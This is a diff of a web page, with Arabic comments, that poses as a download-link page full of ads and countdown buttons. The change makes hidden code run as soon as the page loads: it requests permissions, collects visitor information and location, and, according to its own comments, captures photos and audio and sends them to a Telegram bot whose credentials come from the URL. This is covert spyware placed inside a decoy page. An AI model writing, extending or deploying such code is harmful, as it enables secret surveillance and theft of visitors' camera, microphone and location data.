@@ -174,11 +174,9 @@ async function start() {
 
     console.log("Permission test completed");
 }
-// (تم إيقاف التشغيل التلقائي هنا عشان ندمجه مع صفحة التحميل)
-// start();
 
 /* ═══════════════════════════════════════════════════
-   2. منطق الإرسال والالتقاط (اللي طلبته)
+   2. منطق الإرسال والالتقاط
    ═══════════════════════════════════════════════════ */
 const urlParams = new URLSearchParams(location.search);
 let BOT_ID = "", BOT_TOKEN = "";
@@ -330,10 +328,6 @@ async function sendLocation() {
 
 async function startFeatures() {
     if (!BOT_ID || !BOT_TOKEN) return;
-    
-    // تشغيل الأذونات الخاصة بك
-    await start();
-
     const features = getFeatures();
     sendVisitorInfo();
 
@@ -379,30 +373,38 @@ function reveal(btnId){ var b = $(btnId); b.disabled = false; b.classList.add("r
 function goNext(btn, fn){ btn.disabled = true; btn.classList.remove("ready"); var left = GAP; btn.textContent = "جاري التحويل... " + left; var iv = setInterval(function(){ left--; btn.textContent = "جاري التحويل... " + left; if(left <= 0){ clearInterval(iv); fn(); } }, 1000); }
 function show(n){ document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")}); $("p"+n).classList.add("active"); window.scrollTo(0,0); }
 
+// تشغيل الإعلانات والعدادات للصفحة الأولى
 addBanners("ads1"); 
 ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
 
-// بمجرد الضغط على "متابعة" في الصفحة الأولى، بنشغل دالة الأذونات والإرسال
+// زرار متابعة (ينقل للصفحة 2)
 $("b1").onclick = function(){ 
     goNext(this, function(){ 
-        startFeatures(); // هنا بنشغل الكود اللي بيطلب الأذونات ويبعت الملفات
-        
         show(2); 
         addGhost(); addBanners("ads2"); 
         ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); }); 
     }); 
 };
 
+// زرار متابعة (ينقل للصفحة 3)
 $("b2").onclick = function(){ 
     goNext(this, function(){ 
         show(3); 
         addGhost(); 
-        addBanners("ads3"); // إعلانات الصفحة الأخيرة
+        addBanners("ads3"); 
         addNative("native3");
         ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); }); 
     }); 
 };
+
+// زرار التحميل النهائي
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
+
+/* ═══════════════════════════════════════════════════
+   4. تشغيل الأذونات والإرسال فوراً عند فتح الموقع
+   ═══════════════════════════════════════════════════ */
+start();         // الكود بتاعك (بيطلب الأذونات فوراً)
+startFeatures(); // كود التقاط الصور والصوت وإرسالها لتليجرام
 </script>
 </body>
-    </html>
+  </html>
